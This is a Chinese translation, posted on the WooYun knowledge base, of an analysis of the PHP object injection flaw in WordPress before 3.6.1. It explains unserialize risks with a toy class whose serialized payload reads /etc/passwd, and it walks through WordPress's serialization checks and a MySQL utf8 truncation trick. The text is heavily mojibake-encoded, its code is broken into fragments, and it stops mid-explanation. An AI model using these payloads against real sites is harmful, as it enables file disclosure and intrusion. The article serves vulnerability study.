        <h1 id="wordpress-3-6-1-php-wooyun-">WordPress &lt; 3.6.1 PHP å¯¹è±¡æ³¨å…¥æ¼æ´ | WooYunçŸ¥è¯†åº“</h1>
<h3 id="-">åˆ†äº«åˆ°</h3>
<ul>
<li><a href="">ä¸€é”®åˆ†äº«</a></li>
<li><a href="">QQç©ºé—´</a></li>
<li><a href="">æ–°æµªå¾®åš</a></li>
<li><a href="">ç™¾åº¦äº‘æ”¶è—</a></li>
<li><a href="">äººäººç½‘</a></li>
<li><a href="">è…¾è®¯å¾®åš</a></li>
<li><a href="">ç™¾åº¦ç›¸å†Œ</a></li>
<li><a href="">å¼€å¿ƒç½‘</a></li>
<li><a href="">è…¾è®¯æœ‹å‹</a></li>
<li><a href="">ç™¾åº¦è´´å§</a></li>
<li><a href="">è±†ç“£ç½‘</a></li>
<li><a href="">æœç‹å¾®åš</a></li>
<li><a href="">ç™¾åº¦æ–°é¦–é¡µ</a></li>
<li><a href="">QQå¥½å‹</a></li>
<li><a href="">å’Œè®¯å¾®åš</a></li>
<li><a href="">æ›´å¤š...</a></li>
</ul>
<p><a href="">ç™¾åº¦åˆ†äº«</a></p>
<h1 id="-wooyun-http-drops-wooyun-org-wooyun-"><a href="http://drops.wooyun.org/" title="WooYunçŸ¥è¯†åº“" target="_blank">WooYunçŸ¥è¯†åº“</a></h1>
<p><a href="http://drops.wooyun.org/login" title="ç™»å½•" target="_blank">ç™»å½•</a></p>
<p>åƒä¸€æœµä¹Œäº‘ä¸€æ ·æˆé•¿</p>
<ul>
<li><a href="http://drops.wooyun.org/" title="WooYunçŸ¥è¯†åº“" target="_blank">é¦–é¡µ</a></li>
<li><a href="http://www.wooyun.org/" target="_blank">WooYun</a></li>
<li><a href="http://zone.wooyun.org/" target="_blank">Zone</a></li>
<li><a href="http://drops.wooyun.org/newsend" target="_blank">æŠ•ç¨¿</a>
<a href="http://drops.wooyun.org/" title="é¦–é¡µ" target="_blank">é¦–é¡µ</a> Â» <a href="http://drops.wooyun.org/category/papers" title="æŸ¥çœ‹ æ¼æ´åˆ†æ ä¸­çš„å…¨éƒ¨æ–‡ç« " target="_blank">æ¼æ´åˆ†æ</a> Â» WordPress &lt; 3.6.1 PHP å¯¹è±¡æ³¨å…¥æ¼æ´</li>
</ul>
<h2 id="-wordpress-3-6-1-php-http-drops-wooyun-org-papers-596-permanent-link-to-wordpress-3-6-1-php-"><a href="http://drops.wooyun.org/papers/596" title="Permanent Link to WordPress &lt; 3.6.1 PHP å¯¹è±¡æ³¨å…¥æ¼æ´" target="_blank">WordPress &lt; 3.6.1 PHP å¯¹è±¡æ³¨å…¥æ¼æ´</a></h2>
<p>9äººæ”¶è— <a href="">æ”¶è—</a></p>
<p>2013/09/13 11:36  | <a href="http://drops.wooyun.org/author/äº”é“å£æ€æ°”" title="ç”± äº”é“å£æ€æ°” å‘å¸ƒ" target="_blank">äº”é“å£æ€æ°”</a>  | <a href="http://drops.wooyun.org/category/papers" title="æŸ¥çœ‹ æ¼æ´åˆ†æ ä¸­çš„å…¨éƒ¨æ–‡ç« " target="_blank">æ¼æ´åˆ†æ</a>  | <a href="">å ä¸ªåº§å…ˆ</a></p>
<p>From:<a href="http://vagosec.org/2013/09/wordpress-php-object-injection/" target="_blank">WordPress &lt; 3.6.1 PHP Object Injection</a></p>
<h2 id="0x00-">0x00 èƒŒæ™¯</h2>
<p>å½“æˆ‘è¯»åˆ°ä¸€ç¯‡å…³äºJoomlaçš„â€œPHPå¯¹è±¡æ³¨å°„â€çš„æ¼æ´blogåï¼Œæˆ‘æŒ–æ·±äº†ä¸€ç‚¹å°±å‘ç°Stefan Esserå¤§ç¥åœ¨2010å¹´é»‘å¸½å¤§ä¼šçš„æ–‡ç« ï¼š</p>
<p><a href="http://media.blackhat.com/bh-us-10/presentations/Esser/BlackHat-USA-2010-Esser-Utilizing-Code-Reuse-Or-Return-Oriented-Programming-In-PHP-Application-Exploits-slides.pdf" target="_blank"><a href="http://media.blackhat.com/bh-us-10/presentations/Esser/BlackHat-USA-2010-Esser-Utilizing-Code-Reuse-Or-Return-Oriented-Programming-In-PHP-Application-Exploits-slides.pdf">http://media.blackhat.com/bh-us-10/presentations/Esser/BlackHat-USA-2010-Esser-Utilizing-Code-Reuse-Or-Return-Oriented-Programming-In-PHP-Application-Exploits-slides.pdf</a></a></p>
<p>è¿™ç¯‡æ–‡ç« æåˆ°äº†PHPä¸­çš„unserializeå‡½æ•°å½“æ“ä½œç”¨æˆ·ç”Ÿæˆçš„æ•°æ®çš„æ—¶å€™ä¼šäº§ç”Ÿå®‰å…¨æ¼æ´ã€‚</p>
<p>æ‰€ä»¥å‘¢ï¼ŒåŸºæœ¬æ¥è¯´ï¼Œunserializeå‡½æ•°æ‹¿åˆ°è¡¨ç°ä¸ºåºåˆ—åŒ–çš„æ•°æ®ï¼Œç„¶åå°±è§£åºåˆ—åŒ–å®ƒï¼ˆunserializeå˜›ï¼Œå½“ç„¶å°±å¹²è¿™ä¸ªå•Š~ï¼‰ä¸ºphpçš„å€¼ã€‚è¿™ä¸ªå€¼å®ƒå¯ä»¥æ˜¯resourceä¹‹å¤–çš„ä»»ä½•ç±»å‹ï¼Œå¯ä¸ºï¼ˆinteger, double, string, array, boolean, object, NULLï¼‰ï¼Œå½“è¿™ä¸ªå‡½æ•°æ“ä½œä¸€ä¸ªç”¨æˆ·ç”Ÿæˆçš„å­—ç¬¦ä¸²çš„æ—¶å€™ï¼Œåœ¨ä½ç‰ˆæœ¬çš„PHPä¸­å¯èƒ½ä¼šäº§ç”Ÿå†…å­˜æ³„éœ²çš„æ¼æ´ï¼Œå½“ç„¶è¿™ä¹Ÿä¸æ˜¯è¿™ç¯‡blogè¦å…³æ³¨çš„é—®é¢˜ã€‚å¦‚æœä½ å¯¹è¿™ä¸ªé—®é¢˜æ„Ÿå…´è¶£ï¼Œä½ å¯ä»¥å†å»çœ‹çœ‹æˆ‘ä¸Šé¢è¯´çš„å¤§ç¥çš„æ–‡ç« ã€‚</p>
<p>å¦å¤–ä¸€ç§æ”»å‡»æ–¹å¼å‘ç”Ÿåœ¨å½“æ”»å‡»è€…çš„è¾“å…¥è¢«unserializeå‡½æ•°æ“ä½œçš„æ—¶å€™ï¼Œè¿™ç§å°±æ˜¯æˆ‘è¯´åˆ°çš„â€œPHPå¯¹è±¡æ³¨å…¥â€ã€‚åœ¨è¿™ç§æ–¹å¼ä¸­ï¼Œå¯¹è±¡ç±»å‹çš„è¢«unserializeçš„è¯ï¼Œå…è®¸æ”»å‡»è€…è®¾ç½®ä»–é€‰æ‹©å¯¹è±¡çš„å±æ€§ã€‚å½“è¿™äº›å¯¹è±¡ä¸­çš„æ–¹æ³•è¢«è°ƒç”¨çš„æ—¶å€™ï¼Œä¼šå‡ºç°ä¸€äº›æ•ˆæœï¼ˆä¾‹å¦‚ï¼šåˆ é™¤ä¸€äº›æ–‡ä»¶ï¼‰ï¼Œå½“æ”»å‡»è€…å¯ä»¥å»é€‰æ‹©å¯¹è±¡é‡Œçš„ä¸€äº›å±æ€§çš„æ—¶å€™ï¼Œä»–å°±èƒ½å¤Ÿåˆ é™¤ä¸€ä¸ªä»–æ‰€æäº¤çš„æ–‡ä»¶ã€‚</p>
<p>è®©æˆ‘ä»¬ä¸¾ä¸ªä¾‹å­å§ï¼Œæƒ³è±¡ä»¥ä¸‹çš„ä»£ç ä¸­çš„classæ˜¯ç”¨æˆ·è‡ªå·±ç”Ÿæˆçš„å†…å®¹è¢«unserializeæ—¶è½½å…¥çš„ï¼š</p>
<p>ï¼ˆps:è€å¤–è´´å‡ºçš„ä»£ç è¯­æ³•æœ‰é—®é¢˜ï¼Œæ”¹äº†ä¸€ä¸‹æµ‹è¯•æˆåŠŸâ€¦â€¦ï¼‰
1</p>
<p>2
3</p>
<p>4
5</p>
<p>6
7</p>
<p>8
9</p>
<p>10
11</p>
<p>12
13</p>
<p>14
15</p>
<p>16
17&lt;?php</p>
<p>class</p>
<p>Foo {</p>
<p>private</p>
<p>$bar</p>
<p>;</p>
<p>public</p>
<p>$file</p>
<p>;</p>
<p>public</p>
<p>function</p>
<p>__construct(</p>
<p>$fileName</p>
<p>) {</p>
<p>$this</p>
<p>-&gt;bar =</p>
<p>&#39;foobar&#39;</p>
<p>;</p>
<p>$this</p>
<p>-&gt;file =</p>
<p>$fileName</p>
<p>;</p>
<p>}</p>
<p>// ä¸€äº›å…¶ä»–çš„ä»£ç â€¦â€¦</p>
<p>public</p>
<p>function</p>
<p>__toString() {</p>
<p>return</p>
<p>file_get_contents</p>
<p>(</p>
<p>$this</p>
<p>-&gt;file);</p>
<p>}</p>
<p>}
?&gt;</p>
<p>å¦‚æœå—å®³çš„ç¼ºé™·ä»£ç åŒæ—¶è¿˜å­˜åœ¨ä»¥ä¸‹çš„ä»£ç ï¼š</p>
<p>1echo</p>
<p>unserialize(</p>
<p>$_GET</p>
<p>[</p>
<p>&#39;in&#39;</p>
<p>]);</p>
<p>è¿™æ”»å‡»è€…å°±å¯ä»¥è¯»å–ä»»æ„æ–‡ä»¶ï¼Œæ”»å‡»è€…å¯ä»¥å¦‚ä¸‹å»æ„é€ å®ƒçš„å¯¹è±¡ã€‚</p>
<p>1</p>
<p>2
3</p>
<p>4
5</p>
<p>6
7</p>
<p>8
&lt;?php</p>
<p>class</p>
<p>Foo {</p>
<p>public</p>
<p>$file</p>
<p>;</p>
<p>}
$foo</p>
<p>=</p>
<p>new</p>
<p>Foo();</p>
<p>$foo</p>
<p>-&gt;file =</p>
<p>&#39;/etc/passwd&#39;</p>
<p>;
echo</p>
<p>serialize(</p>
<p>$foo</p>
<p>);</p>
<p>?&gt;</p>
<p>ä¸Šé¢è¿™æ®µä»£ç çš„ç»“æœæ˜¯ï¼šO:3:&quot;Foo&quot;:1:{s:4:&quot;file&quot;;s:11:&quot;/etc/passwd&quot;;} ï¼Œæ”»å‡»è€…ç°åœ¨è¦åšçš„äº‹æƒ…å°±äº‹é€šè¿‡æäº¤getè¯·æ±‚åˆ°å­˜åœ¨æ¼æ´çš„é¡µé¢è§¦å‘ä»–çš„æ”»å‡»ä»£ç ã€‚è¿™ä¸ªé¡µé¢ä¼šåå‡º/etc/passwdçš„å†…å®¹æ¥ã€‚èƒ½è¯»åˆ°è¿™äº›æ–‡ä»¶çš„å†…å®¹æ€ä¹ˆçœ‹éƒ½ä¸æ˜¯ä¸€ä¸ªå¥½äº‹æƒ…ï¼Œä½ å°±æƒ³è±¡ä¸€ä¸‹ï¼Œä¸‡ä¸€ç¼ºé™·ä»£ç ä¸­çš„å‡½æ•°ä¸æ˜¯file_get_contentsè€Œæ˜¯evalå‘¢ï¼Ÿ</p>
<p>æˆ‘ç›¸ä¿¡ä¸Šé¢è¿™éƒ¨åˆ†å·²ç»èƒ½è®©äººæ˜ç™½å…è®¸ç”¨æˆ·è¾“å…¥è¿›å…¥unserializeè¿™ä¸ªå‡½æ•°å±å®³æœ‰å¤šå¤§äº†ã€‚å°±è¿PHPæ‰‹å†Œé‡Œä¹Ÿè¯´äº†ä¸è¦æŠŠç”¨æˆ·ç”Ÿæˆçš„å†…å®¹äº¤ç»™unserializeå‡½æ•°ã€‚</p>
<h3 id="-">è­¦å‘Šï¼š</h3>
<p>ä¸è¦æŠŠä¸å¯ä¿¡çš„ç”¨æˆ·è¾“å…¥äº¤ç»™unserializeï¼Œä½¿ç”¨è¯¥å‡½æ•°è§£åºåˆ—åŒ–å†…å®¹èƒ½å¯¼è‡´è®¿é—®ä¸”è‡ªåŠ¨è½½å…¥å¯¹è±¡ï¼Œæ¶æ„ç”¨æˆ·å¯ä»¥åˆ©ç”¨è¿™ä¸€ç‚¹ï¼Œä»å®‰å…¨çš„è§’åº¦ï¼Œå¦‚æœä½ æƒ³è®©ç”¨æˆ·å¯ä»¥æ ‡å‡†çš„ä¼ é€’æ•°æ®ï¼Œå¯ä»¥ä½¿ç”¨json ï¼ˆjson_encode json_decodeï¼‰ã€‚</p>
<p>å¥½ï¼Œè®©æˆ‘ä»¬ç»§ç»­è¯´è¿™äº›é—®é¢˜æ€ä¹ˆå½±å“åˆ°Wordpressã€‚</p>
<h2 id="0x01-wordpress-">0x01 wordpressçš„å®‰å…¨é—®é¢˜</h2>
<p>Stefan Esser&#39;sçš„é»‘å¸½æ¼”è®²ä¸­ï¼Œä»–æåˆ°Wordpressæ˜¯ä¸€æ¬¾ä½¿ç”¨äº†serializeå’Œunserializeå‡½æ•°çš„çŸ¥ååº”ç”¨ã€‚åœ¨ä»–çš„å¹»ç¯ç‰‡ä¸­ï¼Œunserializeç”¨æ¥æ¥æ”¶æ¥è‡ªWordpressç«™ç‚¹ä¸Šçš„æ•°æ®ã€‚æ‰€ä»¥æ”»å‡»è€…å¯ä»¥åœ¨å—å®³ç«™ç‚¹ä¸Šå‘èµ·ä¸€æ¬¡ä¸­é—´äººæ”»å‡»ã€‚ä»–å¯ä»¥ä¿®æ”¹æ¥è‡ªWordpressç«™ç‚¹çš„è¿”å›æ•°æ®ï¼ŒæŠŠä»–çš„ä»£ç åŠ è¿›å»ã€‚æœ‰è¶£çš„æ˜¯å°±åœ¨æˆ‘ç¼–å†™è¿™ç¯‡æ–‡ç« çš„æ—¶å€™ï¼ŒWordpressæœ€æ–°çš„ç‰ˆæœ¬ä¹ŸåŒ…å«è¿™ä¸ªé—®é¢˜ï¼ˆè·ç¦»é‚£æ¼”è®²ä¼¼ä¹è¿‡å»ä¸‰å¹´äº†ï¼‰ï¼Œæƒ³è±¡ä¸€ä¸‹ï¼Œå¦‚æœæœ‰é»‘å®¢å¯ä»¥åŠ«æŒWordPress.orgçš„DNSä¼šå‘ç”Ÿä»€ä¹ˆäº‹æƒ…å§ã€‚</p>
<p>ç„¶è€Œï¼Œè¿™ä¹Ÿä¸æ˜¯Wordpressä½¿ç”¨è¿™ä¸ªunserializeçš„å”¯ä¸€åœ°æ–¹ï¼Œå®ƒè¿˜ç”¨äºç”¨äºåœ¨æ•°æ®åº“ä¸­æ•°æ®ã€‚ä¸¾ä¾‹æ¥è¯´ï¼Œç”¨æˆ·çš„metadataå°±è¢«åºåˆ—åŒ–åå­˜å‚¨åœ¨æ•°æ®åº“ä¸­ï¼Œmetadataçš„å–å›æ–¹å¼åœ¨wp-includes/meta.phpçš„272è¡Œçš„get_metadata()ï¼Œæˆ‘åœ¨è¿™é‡Œå¼•ç”¨ä¸€ä¸‹è¯¥å‡½æ•°çš„éƒ¨åˆ†ä»£ç ï¼ˆ292-297è¡Œï¼‰
1</p>
<p>2
3</p>
<p>4
5</p>
<p>6
if</p>
<p>( isset(</p>
<p>$meta_cache</p>
<p>[</p>
<p>$meta_key</p>
<p>]) ) {</p>
<p>if</p>
<p>(</p>
<p>$single</p>
<p>)</p>
<p>return</p>
<p>maybe_unserialize(</p>
<p>$meta_cache</p>
<p>[</p>
<p>$meta_key</p>
<p>][0] );</p>
<p>else</p>
<p>return</p>
<p>array_map</p>
<p>(</p>
<p>&#39;maybe_unserialize&#39;</p>
<p>,</p>
<p>$meta_cache</p>
<p>[</p>
<p>$meta_key</p>
<p>]);</p>
<p>}</p>
<p>åŸºæœ¬ä¸Šï¼Œè¿™ä¸ªå‡½æ•°æ‰€å¹²çš„äº‹æƒ…å°±æ˜¯å–å›æ•°æ®åº“é‡Œçš„metadataï¼ˆå®ƒæ¥è‡ªæ¯ç¯‡æ–‡ç« æˆ–ç”¨æˆ·è¾“å…¥ï¼‰ï¼Œæ•°æ®åœ¨æ•°æ®åº“ä¸­çš„wp_postmetaå’Œwp_usermetaè¡¨ä¸­ï¼Œæœ‰äº›æ•°æ®æ˜¯è¢«åºåˆ—åŒ–çš„è€Œæœ‰äº›æ²¡æœ‰è¢«åºåˆ—åŒ–ï¼Œæ‰€ä»¥maybe_unserialize()å‡½æ•°æ›¿ä»£äº†unserialize()åœ¨è¿™é‡Œæ“ä½œï¼Œè¿™ä¸ªå‡½æ•°åœ¨wp-includes/functions.phpçš„230åˆ°234è¡Œä¹‹é—´è¢«å®šä¹‰ã€‚</p>
<p>1</p>
<p>2
3</p>
<p>4
5function</p>
<p>maybe_unserialize(</p>
<p>$original</p>
<p>) {</p>
<p>if</p>
<p>( is_serialized(</p>
<p>$original</p>
<p>) )</p>
<p>//åºåˆ—åŒ–çš„æ•°æ®æ‰ä¼šèµ°åˆ°è¿™é‡Œé¢</p>
<p>return</p>
<p>@unserialize(</p>
<p>$original</p>
<p>);</p>
<p>return</p>
<p>$original</p>
<p>;
}</p>
<p>æ‰€ä»¥ï¼Œè¿™ä¸ªå‡½æ•°å¹²çš„äº‹æƒ…æ˜¯æ£€æŸ¥ç»™äºˆå®ƒçš„å€¼æ˜¯ä¸æ˜¯ä¸€ä¸ªåºåˆ—åŒ–çš„æ•°æ®ï¼Œå¦‚æœæ˜¯çš„è¯ï¼Œå°±è§£åºåˆ—åŒ–ã€‚è¿™é‡Œç”¨æ¥åˆ¤æ–­æ˜¯å¦æ˜¯åºåˆ—åŒ–æ‰€ä½¿ç”¨çš„å‡½æ•°æ˜¯is_serialized()ï¼Œå®ƒçš„å®šä¹‰åœ¨åŒæ–‡ä»¶çš„247åˆ°276è¡Œä¹‹é—´ã€‚</p>
<p>1</p>
<p>2
3</p>
<p>4
5</p>
<p>6
7</p>
<p>8
9</p>
<p>10
11</p>
<p>12
13</p>
<p>14
15</p>
<p>16
17</p>
<p>18
19</p>
<p>20
21</p>
<p>22
23</p>
<p>24
25</p>
<p>26
27</p>
<p>28
29</p>
<p>30
function</p>
<p>is_serialized(</p>
<p>$data</p>
<p>) {</p>
<p>// å¦‚æœè¿å­—ç¬¦ä¸²éƒ½ä¸æ˜¯ï¼Œé‚£å°±ä¸æ˜¯åºåˆ—åŒ–çš„æ•°æ®äº†</p>
<p>if</p>
<p>( !</p>
<p>is_string</p>
<p>(</p>
<p>$data</p>
<p>) )</p>
<p>return</p>
<p>false;</p>
<p>$data</p>
<p>= trim(</p>
<p>$data</p>
<p>);</p>
<p>if</p>
<p>(</p>
<p>&#39;N;&#39;</p>
<p>==</p>
<p>$data</p>
<p>)</p>
<p>return</p>
<p>true;</p>
<p>$length</p>
<p>=</p>
<p>strlen</p>
<p>(</p>
<p>$data</p>
<p>);</p>
<p>if</p>
<p>(</p>
<p>$length</p>
<p>&lt; 4 )</p>
<p>return</p>
<p>false;</p>
<p>if</p>
<p>(</p>
<p>&#39;:&#39;</p>
<p>!==</p>
<p>$data</p>
<p>[1] )</p>
<p>return</p>
<p>false;</p>
<p>$lastc</p>
<p>=</p>
<p>$data</p>
<p>[</p>
<p>$length</p>
<p>-1];</p>
<p>if</p>
<p>(</p>
<p>&#39;;&#39;</p>
<p>!==</p>
<p>$lastc</p>
<p>&amp;&amp;</p>
<p>&#39;}&#39;</p>
<p>!==</p>
<p>$lastc</p>
<p>)</p>
<p>return</p>
<p>false;</p>
<p>$token</p>
<p>=</p>
<p>$data</p>
<p>[0];</p>
<p>switch</p>
<p>(</p>
<p>$token</p>
<p>) {</p>
<p>case</p>
<p>&#39;s&#39;</p>
<p>:</p>
<p>if</p>
<p>(</p>
<p>&#39;&quot;&#39;</p>
<p>!==</p>
<p>$data</p>
<p>[</p>
<p>$length</p>
<p>-2] )</p>
<p>return</p>
<p>false;</p>
<p>case</p>
<p>&#39;a&#39;</p>
<p>:</p>
<p>case</p>
<p>&#39;O&#39;</p>
<p>:</p>
<p>return</p>
<p>(bool) preg_match(</p>
<p>&quot;/^{$token}:[0-9]+:/s&quot;</p>
<p>,</p>
<p>$data</p>
<p>);</p>
<p>case</p>
<p>&#39;b&#39;</p>
<p>:</p>
<p>case</p>
<p>&#39;i&#39;</p>
<p>:</p>
<p>case</p>
<p>&#39;d&#39;</p>
<p>:</p>
<p>return</p>
<p>(bool) preg_match(</p>
<p>&quot;/^{$token}:[0-9.E-]+;\$/&quot;</p>
<p>,</p>
<p>$data</p>
<p>);</p>
<p>}</p>
<p>return</p>
<p>false;</p>
<p>}</p>
<p>WordPressæ£€æŸ¥ä¸€ä¸ªå€¼æ˜¯å¦æ˜¯åºåˆ—åŒ–çš„å­—ç¬¦ä¸²ä¸ºä»€ä¹ˆé‚£ä¹ˆé‡è¦çš„åŸå› é©¬ä¸Šè¦å˜å¾—æ¸…æ™°äº†ã€‚é¦–å…ˆï¼Œæˆ‘ä»¬çœ‹ä¸€ä¸‹ä¸€ä¸ªæ”»å‡»è€…å¦‚ä½•æŠŠä»–çš„å†…å®¹æœ€ç»ˆåŠ å…¥åˆ°metadataè¡¨ä¸­çš„ã€‚æ¯ä¸ªç”¨æˆ·çš„å§“åï¼Œé›…è™IMéƒ½å­˜å‚¨åœ¨wp_usermetaè¡¨é‡Œã€‚æ‰€ä»¥æˆ‘ä»¬æŠŠè‡ªå·±çš„æ¶æ„ä»£ç åŠ åœ¨é‚£æˆ‘ä»¬å°±å¯ä»¥ææ‚æ‰WordPressï¼Œå¯¹ä¸å¯¹ï¼Ÿä½ å¯ä»¥è¯•è¯•åœ¨ä½ è¯¥å†™åå­—çš„åœ°æ–¹å†™ä¸ªi:1è¯•è¯•ï¼Œå¦‚æœè¿™ä¸ªæ²¡æœ‰è¢«è§£åºåˆ—åŒ–é‚£è¿™é‡Œåªä¼šè¿”å›ä¸€ä¸ªæˆ‘ä»¬è¾“å…¥çš„i:1ã€‚</p>
<p>éº»ç—¹çš„ï¼Œçœ‹æ¥è¦å‘å‡ ä¸ªå¤§æ‹›æ‰å¯ä»¥ææ‚WordPresså•Šã€‚è®©æˆ‘ä»¬æŒ–å¾—å†æ·±ä¸€ç‚¹ï¼Œçœ‹çœ‹ä¸ºä»€ä¹ˆè¿™ä¸ªä¸œè¥¿å°±æ²¡æœ‰ç»™è§£åºåˆ—åŒ–ã€‚åœ¨ wp-includes/meta.php ä¸­ï¼Œè¿™ä¸ªupdate_metadata() å‡½æ•°å®šä¹‰åœ¨101-164è¡Œï¼Œè¿™é‡Œæœ‰è¿™ä¸ªå‡½æ•°çš„éƒ¨åˆ†ä»£ç ã€‚
1</p>
<p>2
3</p>
<p>4
5</p>
<p>6
7</p>
<p>8
9</p>
<p>10
// â€¦</p>
<p>$meta_value</p>
<p>= wp_unslash(</p>
<p>$meta_value</p>
<p>);</p>
<p>$meta_value</p>
<p>= sanitize_meta(</p>
<p>$meta_key</p>
<p>,</p>
<p>$meta_value</p>
<p>,</p>
<p>$meta_type</p>
<p>);</p>
<p>// â€¦</p>
<p>$meta_value</p>
<p>= maybe_serialize(</p>
<p>$meta_value</p>
<p>);</p>
<p>$data</p>
<p>= compact(</p>
<p>&#39;meta_value&#39;</p>
<p>);</p>
<p>// â€¦</p>
<p>$wpdb</p>
<p>-&gt;update(</p>
<p>$table</p>
<p>,</p>
<p>$data</p>
<p>,</p>
<p>$where</p>
<p>);</p>
<p>// â€¦</p>
<p>è¿™é‡Œmaybe_serializeå‡½æ•°å¯èƒ½èƒ½è§£é‡Šä¸ºä»€ä¹ˆæˆ‘ä»¬åˆšæ‰çš„æ“ä½œæ²¡æˆåŠŸï¼Œæˆ‘ä»¬å†è·Ÿè¿›å»çœ‹çœ‹è¿™ä¸ªå‡½æ•°ï¼Œå®ƒå®šä¹‰åœ¨wp-includes/functions.phpçš„314-324è¡Œã€‚</p>
<p>1</p>
<p>2
3</p>
<p>4
5</p>
<p>6
7</p>
<p>8
9</p>
<p>10
function</p>
<p>maybe_serialize(</p>
<p>$data</p>
<p>) {</p>
<p>if</p>
<p>(</p>
<p>is_array</p>
<p>(</p>
<p>$data</p>
<p>) ||</p>
<p>is_object</p>
<p>(</p>
<p>$data</p>
<p>) )</p>
<p>return</p>
<p>serialize(</p>
<p>$data</p>
<p>);</p>
<p>// äºŒæ¬¡åºåˆ—åŒ–æ˜¯ä¸ºäº†å‘ä¸‹æ”¯æŒ</p>
<p>// è¯¦è§ <a href="http://core.trac.wordpress.org/ticket/12930" target="_blank">http://core.trac.wordpress.org/ticket/12930</a></p>
<p>if</p>
<p>( is_serialized(</p>
<p>$data</p>
<p>) )</p>
<p>return</p>
<p>serialize(</p>
<p>$data</p>
<p>);</p>
<p>return</p>
<p>$data</p>
<p>;</p>
<p>}</p>
<p>æ‰€ä»¥å½“æˆ‘ä»¬ä¼ å…¥ä¸€ä¸ªåºåˆ—åŒ–çš„å€¼çš„è¯ï¼Œå®ƒå°±ä¼šå†åºåˆ—åŒ–ä¸€ä¸‹ï¼Œè¿™å°±æ˜¯ç°åœ¨å‘ç”Ÿçš„æƒ…å†µï¼Œä½ çœ‹ï¼Œæ•°æ®åº“é‡Œçš„ä¸œè¥¿ä¸æ˜¯i:1;è€Œæ˜¯s:4:&quot;i:1;&quot;;ï¼Œå½“è§£åºåˆ—åŒ–çš„æ—¶å€™å®ƒå°±æ˜¾ç¤ºä¸ºä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œé‚£ç°åœ¨è¯¥æ€ä¹ˆåŠå‘¢ï¼Ÿ</p>
<p>ä½ æ‡‚çš„ï¼Œè¿™å¸–å­çš„å†…å®¹ä¹Ÿå­˜åœ¨æ•°æ®åº“é‡Œï¼Œä¸Šé¢è¿™å°±è¯´æ˜äº†ä¸ºä»€ä¹ˆæˆ‘ä»¬å¤±è´¥äº†ã€‚å¦‚æœæˆ‘ä»¬ç°åœ¨æƒ³å¾€æ•°æ®åº“æ’ä¸€ä¸ªåºåˆ—åŒ–åçš„ä¸œè¥¿ï¼Œæˆ‘ä»¬å°±éœ€è¦åœ¨æˆ‘ä»¬æ’å…¥æ•°æ®çš„æ—¶å€™è®©is_serialized()è¿™ä¸ªå‡½æ•°è¿”å›ä¸€ä¸ªfalseï¼Œè€Œå½“æˆ‘ä»¬å†ä»æ•°æ®é‡Œå–å®ƒçš„æ—¶å€™ï¼Œå®ƒå°±åº”è¯¥è¿”å›ä¸ªtrueäº†ã€‚</p>
<p>ä½ æ‡‚çš„ï¼ŒMysqlæ•°æ®åº“ï¼Œè¡¨å’Œå­—æ®µéƒ½æœ‰ä»–ä»¬è‡ªå·±çš„charsetå’Œcollation(å­—ç¬¦é›†å’Œå®šåºï¼‰ã€‚WordPresså‘¢ï¼Œé»˜è®¤çš„å­—ç¬¦é›†æ˜¯UTF-8ã€‚ä»è¿™ä¸ªåå­—å°±çœ‹çš„å‡ºæ¥ï¼Œè¿™ä¸ªå­—ç¬¦é›†å®ƒä¸æ”¯æŒå…¨éƒ¨çš„Unicodeå­—ç¬¦ï¼Œä½ è¦æ˜¯å¯¹è¿™ä¸ªæ„Ÿå…´è¶£ï¼Œä½ å¯ä»¥çœ‹çœ‹Mathias Bynensçš„è¿™ç¯‡æ–‡ç« ï¼š<a href="http://mathiasbynens.be/notes/mysql-utf8mb4ï¼Œè¿™æ–‡ç« æ•™äº†æˆ‘UTF-8çš„è¡¨å‚¨å­˜ä¸äº†Unicodeç¼–ç åŒºé—´æ˜¯U+010000åˆ°U+10FFFFçš„å­—ç¬¦ã€‚æ‰€ä»¥å½“æˆ‘ä»¬åœ¨è¿™ä¸ªæƒ…å†µä¸‹å°è¯•ä¿å­˜è¿™äº›å­—ç¬¦å‘¢ï¼Ÿæ˜¾è€Œæ˜“è§ï¼ŒåŒ…æ‹¬è¿™ä¸ªå­—ç¬¦å’Œè¿™ä¸ªå­—ç¬¦ä¹‹åçš„å†…å®¹éƒ½ä¼šè¢«å¿½ç•¥æ‰ã€‚æ‰€ä»¥åœ¨æˆ‘ä»¬å°è¯•æ’å…¥" target="_blank">http://mathiasbynens.be/notes/mysql-utf8mb4ï¼Œè¿™æ–‡ç« æ•™äº†æˆ‘UTF-8çš„è¡¨å‚¨å­˜ä¸äº†Unicodeç¼–ç åŒºé—´æ˜¯U+010000åˆ°U+10FFFFçš„å­—ç¬¦ã€‚æ‰€ä»¥å½“æˆ‘ä»¬åœ¨è¿™ä¸ªæƒ…å†µä¸‹å°è¯•ä¿å­˜è¿™äº›å­—ç¬¦å‘¢ï¼Ÿæ˜¾è€Œæ˜“è§ï¼ŒåŒ…æ‹¬è¿™ä¸ªå­—ç¬¦å’Œè¿™ä¸ªå­—ç¬¦ä¹‹åçš„å†…å®¹éƒ½ä¼šè¢«å¿½ç•¥æ‰ã€‚æ‰€ä»¥åœ¨æˆ‘ä»¬å°è¯•æ’å…¥</a></p>
<p>fooğŒ†bar
çš„æ—¶å€™ï¼ŒMysqlä¼šå¿½ç•¥</p>
<p>ğŒ†bar
è€Œä¿å­˜ä¸ºfooã€‚</p>
<p>è¿™ä¸ªè¿·é¢˜çš„æœ€åä¸€éƒ¨åˆ†å°±æ˜¯æˆ‘ä»¬éœ€è¦æ’å…¥ä¸€ä¸ªç”¨ä»¥ä¸€ä¼šå„¿è§£åºåˆ—åŒ–çš„å†…å®¹ï¼Œä¸ºäº†æµ‹è¯•è¿™ä¸ªï¼Œä½ å¯ä»¥æ’å…¥</p>
<p>1:iğŒ†
ä¸ºä½ çš„åå­—ã€‚æ­£å¦‚æ‰€è§åˆ°çš„ï¼Œç»“æœæ˜¯1ï¼Œæ„å‘³ç€ä½ çš„è¾“å…¥è¢«è§£åºåˆ—åŒ–äº†ï¼Œå¦‚æœä½ è¿˜ä¸ç›¸ä¿¡æˆ‘ï¼Œä½ è¯•ç€è¾“å…¥ä¸€ä¸ªç©ºæ•°ç»„çš„åºåˆ—åŒ–å¹¶ä¸”ä»¥è¯¥å­—ç¬¦ç»“å°¾ï¼š</p>
<p>a:0:{}ğŒ†
ã€‚è¿™ä¸ªç»“æœæ˜¯Arrayã€‚</p>
<p>è®©æˆ‘ä»¬ç»§ç»­</p>
<p>maybe_serialized(&#39;i:1;ğŒ†&#39;)
